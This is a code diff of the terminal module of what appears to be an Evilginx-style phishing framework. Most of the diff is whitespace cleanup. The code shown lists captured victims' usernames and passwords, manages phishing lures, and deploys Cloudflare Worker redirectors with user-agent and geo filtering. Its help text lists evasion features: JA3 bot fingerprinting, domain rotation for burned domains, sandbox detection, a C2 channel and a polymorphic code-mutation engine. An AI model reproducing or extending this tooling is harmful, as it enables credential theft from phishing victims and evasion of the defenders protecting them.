+			row := []string{strconv.Itoa(s.Id), lred.Sprintf("%s", s.Phishlet), lblue.Sprintf("%s", truncateString(s.Username, 24)), lblue.Sprintf("%s", truncateString(s.Password, 24)), tcol, yellow.Sprintf("%s", s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
 			rows = append(rows, row)
 		}
 		log.Printf("\n%s\n", AsTable(cols, rows))
@@ -2298,7 +2300,7 @@ func (t *Terminal) handleLures(args []string) error {
 				// Use configured strategy for lure path generation
 				strategy := t.cfg.GetLureGenerationStrategy()
 				lurePath := GenRandomLureString(strategy)
-				
+
 				l := &Lure{
 					Path:     "/" + lurePath,
 					Phishlet: args[1],
@@ -2744,7 +2746,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 
 		workerType := args[1]
 		redirectUrl := args[2]
-		
+
 		var config CloudflareWorkerConfig
 		config.LogRequests = false
 		config.DelaySeconds = 0
@@ -2770,12 +2772,12 @@ func (t *Terminal) handleCloudflare(args []string) error {
 			if err != nil {
 				return fmt.Errorf("invalid lure ID: %v", err)
 			}
-			
+
 			lure, err := t.cfg.GetLure(lureId)
 			if err != nil {
 				return fmt.Errorf("lure not found: %v", err)
 			}
-			
+
 			if lure.Hostname != "" && lure.Path != "" {
 				redirectUrl = fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
 				if lure.UserAgentFilter != "" {
@@ -2838,14 +2840,14 @@ func (t *Terminal) handleCloudflare(args []string) error {
 			log.Info("geo filter: %s", hcyan.Sprint(strings.Join(config.GeoFilter, ", ")))
 		}
 		log.Info("deploy this script to Cloudflare Workers to create your redirector")
-		
+
 		return nil
 	}
 
 	// Handle 'cloudflare config' command
 	if pn > 0 && args[0] == "config" {
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
-		
+
 		log.Info("cloudflare worker configuration:")
 		log.Info("  enabled: %v", cfConfig.Enabled)
 		if cfConfig.AccountID != "" {
@@ -2868,7 +2870,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		} else {
 			log.Info("  subdomain: %s", yellow.Sprint("not set"))
 		}
-		
+
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			log.Warning("cloudflare worker deployment is not properly configured")
 			log.Info("use 'config cloudflare_worker <setting> <value>' to configure")
@@ -2881,20 +2883,20 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			return fmt.Errorf("cloudflare worker deployment is not configured. Run 'config cloudflare_worker' commands first")
 		}
-		
+
 		if pn < 4 {
 			return fmt.Errorf("usage: cloudflare deploy <worker_name> <type> <redirect_url> [options]")
 		}
-		
+
 		workerName := args[1]
 		workerType := args[2]
 		redirectUrl := args[3]
-		
+
 		// Parse worker configuration
 		var config CloudflareWorkerConfig
 		config.LogRequests = false
 		config.DelaySeconds = 0
-		
+
 		// Parse worker type
 		switch workerType {
 		case "simple":
@@ -2909,13 +2911,13 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		default:
 			return fmt.Errorf("invalid worker type: %s (use: simple, html, advanced)", workerType)
 		}
-		
+
 		config.RedirectUrl = redirectUrl
-		
+
 		// Parse additional options
 		var routes []string
 		enableSubdomain := false
-		
+
 		for i := 4; i < pn; i++ {
 			switch args[i] {
 			case "--ua-filter":
@@ -2947,34 +2949,34 @@ func (t *Terminal) handleCloudflare(args []string) error {
 				enableSubdomain = true
 			}
 		}
-		
+
 		// Generate the worker script
 		generator := NewCloudflareWorkerGenerator(t.cfg)
 		workerScript, err := generator.GenerateWorker(config)
 		if err != nil {
 			return fmt.Errorf("failed to generate worker: %v", err)
 		}
-		
+
 		// Deploy the worker
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
 		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
-		
+
 		deployment := &CloudflareWorkerDeployment{
 			Name:      workerName,
 			Script:    workerScript,
 			Routes:    routes,
 			Subdomain: enableSubdomain,
 		}
-		
+
 		log.Info("deploying worker '%s' to Cloudflare...", hiblue.Sprint(workerName))
 		err = api.DeployWorker(deployment)
 		if err != nil {
 			return fmt.Errorf("deployment failed: %v", err)
 		}
-		
+
 		log.Success("worker '%s' deployed successfully!", higreen.Sprint(workerName))
 		log.Info("redirect URL: %s", yellow.Sprint(config.RedirectUrl))
-		
+
 		if enableSubdomain {
 			if cfConfig.WorkerSubdomain != "" {
 				workerURL := fmt.Sprintf("https://%s.%s.workers.dev", workerName, cfConfig.WorkerSubdomain)
@@ -2983,7 +2985,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 				log.Info("worker URL: %s", yellow.Sprint("Configure 'cloudflare_worker subdomain' to see URL"))
 			}
 		}
-		
+
 		return nil
 	}
 
@@ -2992,25 +2994,25 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			return fmt.Errorf("cloudflare worker deployment is not configured")
 		}
-		
+
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
 		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
-		
+
 		log.Info("fetching deployed workers...")
 		workers, err := api.ListWorkers()
 		if err != nil {
 			return fmt.Errorf("failed to list workers: %v", err)
 		}
-		
+
 		if len(workers) == 0 {
 			log.Info("no workers deployed")
 			return nil
 		}
-		
+
 		log.Info("deployed workers:")
 		for _, worker := range workers {
 			log.Info("  %s", hiblue.Sprint(worker.ID))
-			
+
 			// Construct worker URL
 			var workerURL string
 			if cfConfig.WorkerSubdomain != "" {
@@ -3022,7 +3024,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 				log.Info("    url: %s", yellow.Sprint("Configure 'cloudflare_worker subdomain' to see worker URL"))
 				log.Info("         %s", "(Get your subdomain from Cloudflare dashboard -> Workers & Pages)")
 			}
-			
+
 			// Show size information
 			if worker.Size > 0 {
 				log.Info("    size: %d bytes", worker.Size)
@@ -3030,11 +3032,11 @@ func (t *Terminal) handleCloudflare(args []string) error {
 				// Size 0 is normal for Workers using the ES modules format
 				log.Info("    status: %s", higreen.Sprint("✓ deployed"))
 			}
-			
+
 			log.Info("    created: %s", worker.CreatedOn.Format("2006-01-02 15:04:05"))
 			log.Info("    modified: %s", worker.ModifiedOn.Format("2006-01-02 15:04:05"))
 		}
-		
+
 		// List routes if zone ID is configured
 		if cfConfig.ZoneID != "" {
 			routes, err := api.ListWorkerRoutes()
@@ -3045,7 +3047,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 				}
 			}
 		}
-		
+
 		return nil
 	}
 
@@ -3054,22 +3056,22 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			return fmt.Errorf("cloudflare worker deployment is not configured")
 		}
-		
+
 		if pn < 2 {
 			return fmt.Errorf("usage: cloudflare delete <worker_name>")
 		}
-		
+
 		workerName := args[1]
-		
+
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
 		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
-		
+
 		log.Warning("deleting worker '%s'...", workerName)
 		err := api.DeleteWorker(workerName)
 		if err != nil {
 			return fmt.Errorf("failed to delete worker: %v", err)
 		}
-		
+
 		log.Success("worker '%s' deleted successfully", workerName)
 		return nil
 	}
@@ -3079,14 +3081,14 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			return fmt.Errorf("cloudflare worker deployment is not configured")
 		}
-		
+
 		if pn < 3 {
 			return fmt.Errorf("usage: cloudflare update <worker_name> <redirect_url>")
 		}
-		
+
 		workerName := args[1]
 		redirectUrl := args[2]
-		
+
 		// Generate a simple redirect worker with new URL
 		config := CloudflareWorkerConfig{
 			Type:         WorkerTypeSimpleRedirect,
@@ -3094,22 +3096,22 @@ func (t *Terminal) handleCloudflare(args []string) error {
 			LogRequests:  true,
 			DelaySeconds: 0,
 		}
-		
+
 		generator := NewCloudflareWorkerGenerator(t.cfg)
 		workerScript, err := generator.GenerateWorker(config)
 		if err != nil {
 			return fmt.Errorf("failed to generate worker: %v", err)
 		}
-		
+
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
 		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
-		
+
 		log.Info("updating worker '%s'...", hiblue.Sprint(workerName))
 		err = api.UpdateWorker(workerName, workerScript)
 		if err != nil {
 			return fmt.Errorf("failed to update worker: %v", err)
 		}
-		
+
 		log.Success("worker '%s' updated successfully", workerName)
 		log.Info("new redirect URL: %s", yellow.Sprint(redirectUrl))
 		return nil
@@ -3120,25 +3122,25 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		if !t.cfg.IsCloudflareWorkerEnabled() {
 			return fmt.Errorf("cloudflare worker deployment is not configured")
 		}
-		
+
 		if pn < 2 {
 			return fmt.Errorf("usage: cloudflare status <worker_name>")
 		}
-		
+
 		workerName := args[1]
-		
+
 		cfConfig := t.cfg.GetCloudflareWorkerConfig()
 		api := NewCloudflareWorkerAPI(cfConfig.AccountID, cfConfig.APIToken, cfConfig.ZoneID)
-		
+
 		log.Info("checking worker '%s' status...", hiblue.Sprint(workerName))
 		exists, err := api.GetWorkerStatus(workerName)
 		if err != nil {
 			return fmt.Errorf("failed to check worker status: %v", err)
 		}
-		
+
 		if exists {
 			log.Success("worker '%s' is deployed and active", higreen.Sprint(workerName))
-			
+
 			// Get subdomain info
 			subdomain, err := api.GetWorkerSubdomain()
 			if err == nil && subdomain != "" {
@@ -3147,7 +3149,7 @@ func (t *Terminal) handleCloudflare(args []string) error {
 		} else {
 			log.Warning("worker '%s' is not deployed", workerName)
 		}
-		
+
 		return nil
 	}
 
@@ -3275,7 +3277,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
 	h.AddCommand("cloudflare", "general", "manage Cloudflare Worker scripts", "Generate and deploy Cloudflare Worker scripts for redirectors.", LAYER_TOP,
-		readline.PcItem("cloudflare", 
+		readline.PcItem("cloudflare",
 			readline.PcItem("worker", readline.PcItem("simple"), readline.PcItem("html"), readline.PcItem("advanced")),
 			readline.PcItem("deploy"),
 			readline.PcItem("list"),
@@ -3318,7 +3320,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("ja3", "general", "manage JA3/JA3S TLS fingerprinting", "Shows JA3 fingerprinting statistics and manage custom bot signatures.", LAYER_TOP,
 		readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")))
-		
+
 	h.AddSubCommand("ja3", nil, "", "show JA3 fingerprinting statistics")
 	h.AddSubCommand("ja3", []string{"stats"}, "stats", "show detailed JA3 fingerprinting statistics")
 	h.AddSubCommand("ja3", []string{"signatures"}, "signatures", "list all known bot JA3 signatures")
@@ -3326,13 +3328,13 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("ja3", []string{"export"}, "export", "export bot JA3 signatures to JSON")
 
 	h.AddCommand("captcha", "general", "manage CAPTCHA protection", "Configure and manage multiple CAPTCHA providers for bot protection.", LAYER_TOP,
-		readline.PcItem("captcha", 
+		readline.PcItem("captcha",
 			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("provider", readline.PcItem("recaptcha_v2"), readline.PcItem("recaptcha_v3"), readline.PcItem("hcaptcha"), readline.PcItem("turnstile")),
 			readline.PcItem("configure"),
 			readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("test")))
-	
+
 	h.AddSubCommand("captcha", nil, "", "show CAPTCHA configuration and statistics")
 	h.AddSubCommand("captcha", []string{"enable"}, "enable <on|off>", "enable or disable CAPTCHA protection")
 	h.AddSubCommand("captcha", []string{"provider"}, "provider <name>", "set active CAPTCHA provider")
@@ -3353,7 +3355,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("add-provider"),
 			readline.PcItem("mark-compromised"),
 			readline.PcItem("stats")))
-			
+
 	h.AddSubCommand("domain-rotation", nil, "", "show domain rotation configuration and statistics")
 	h.AddSubCommand("domain-rotation", []string{"enable"}, "enable <on|off>", "enable or disable domain rotation")
 	h.AddSubCommand("domain-rotation", []string{"strategy"}, "strategy <type>", "set rotation strategy (round-robin, weighted, health-based, random)")
@@ -3376,7 +3378,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("bandwidth-limit"),
 			readline.PcItem("geo-rule"),
 			readline.PcItem("stats")))
-			
+
 	h.AddSubCommand("traffic-shaping", nil, "", "show traffic shaping configuration and statistics")
 	h.AddSubCommand("traffic-shaping", []string{"enable"}, "enable <on|off>", "enable or disable traffic shaping")
 	h.AddSubCommand("traffic-shaping", []string{"mode"}, "mode <adaptive|strict|learning>", "set traffic shaping mode")
@@ -3395,7 +3397,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("redirect"),
 			readline.PcItem("honeypot"),
 			readline.PcItem("stats")))
-			
+
 	h.AddSubCommand("sandbox", nil, "", "show sandbox detection configuration")
 	h.AddSubCommand("sandbox", []string{"enable"}, "enable <on|off>", "enable or disable sandbox detection")
 	h.AddSubCommand("sandbox", []string{"mode"}, "mode <passive|active|aggressive>", "set detection mode")
@@ -3414,7 +3416,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("auth"),
 			readline.PcItem("test"),
 			readline.PcItem("status")))
-			
+
 	h.AddSubCommand("c2", nil, "", "show C2 channel configuration and status")
 	h.AddSubCommand("c2", []string{"enable"}, "enable <on|off>", "enable or disable C2 channel")
 	h.AddSubCommand("c2", []string{"transport"}, "transport <https|dns>", "set C2 transport method")
@@ -3435,12 +3437,12 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("cache", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("clear")),
 			readline.PcItem("seed-rotation"),
 			readline.PcItem("template-mode", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("mutation", readline.PcItem("variables"), readline.PcItem("functions"), readline.PcItem("deadcode"), 
-				readline.PcItem("controlflow"), readline.PcItem("strings"), readline.PcItem("math"), 
+			readline.PcItem("mutation", readline.PcItem("variables"), readline.PcItem("functions"), readline.PcItem("deadcode"),
+				readline.PcItem("controlflow"), readline.PcItem("strings"), readline.PcItem("math"),
 				readline.PcItem("comments"), readline.PcItem("whitespace")),
 			readline.PcItem("test"),
 			readline.PcItem("stats")))
-			
+
 	h.AddSubCommand("polymorphic", nil, "", "show polymorphic engine configuration")
 	h.AddSubCommand("polymorphic", []string{"enable"}, "enable <on|off>", "enable or disable polymorphic engine")
 	h.AddSubCommand("polymorphic", []string{"level"}, "level <low|medium|high|extreme>", "set mutation level")
@@ -3527,6 +3529,9 @@ func (t *Terminal) checkStatus() {
 }
 
 func (t *Terminal) manageCertificates(verbose bool) {
+	if t.p == nil {
+		return
+	}
 	if !t.p.developer {
 		if t.cfg.IsAutocertEnabled() {
 			hosts := t.p.cfg.GetActiveHostnames("")
